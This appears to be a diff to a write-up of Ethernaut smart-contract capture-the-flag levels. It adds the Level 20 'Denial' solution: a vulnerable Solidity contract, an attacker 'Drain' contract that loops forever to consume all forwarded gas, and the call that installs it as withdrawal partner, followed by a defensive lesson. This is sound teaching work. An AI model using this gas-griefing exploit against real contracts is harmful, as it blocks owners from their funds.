@@ -22,6 +22,9 @@ If you want to do the same, I recommend that you try to solve the levels on your
 17. [Level 16: Preservation](#level-16-preservation)
 18. [Level 17: Recovery](#level-17-recovery)
 19. [Level 18: MagicNumber](#level-18-magic-number)
+20. [Level 19: Alien Codex](#level-19-alien-codex)
+21. [Level 20: Denial](#level-20-denial)
+
 
 ## Level 0: Intro <a name="level-0-intro"></a>
 
@@ -1658,3 +1661,91 @@ Nice :)
 It is important to check which Solidity compiler is being used and what the
 differences are between the versions. Each version gets better and mitigates
 vulnerabilities/weaknesses of the previous versions.
+
+## Level 20: Denial <a name="level-20-denial"></a>
+
+First let's have a look at the contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Denial {
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint256 timeLastWithdrawn;
+    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint256 amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value: amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] += amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+Our goal in this level is to make sure that the owner is not able to withdraw
+their share of the funds.
+
+I am not sure how you feel, but I think after doing all the other levels, this
+should be rather straight forward.
+
+We can set the partner address by call the `setWithdrawPartner` function.
+
+Having a closer look at the `withdraw` function, we can see that the contract
+uses `call` to send the funds to the partner. The `call` function does not check
+the return value of the function call. That means, that if the partner reverts
+the transaction, the owner is still going to get their share.
+But the `call` function is not limited by gas, instead the entire gas of the
+transactions is forwarded to the partner contract, which means that the partner can
+use all the gas to revert the transaction and the owner is not going to get their
+share.
+
+Let's do it :)
+
+Our `partner` contract is going to look like this:
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity ^0.8.0;
+
+contract Drain {
+    receive() external payable {
+        while(true){}
+    }
+}
+```
+
+Deploy the contract and set the address of the contract as the partner address
+of the `Denial` contract.
+
+```javascript
+await contract.setWithdrawPartner("0xaddress of the partner contract")
+```
+
+and you are done :)
+
+### Learning
+
+The `call` function is a powerful tool, but it can also be dangerous. Always
+make sure to check the return value of the function call and limit the gas
+forwarded to the function.
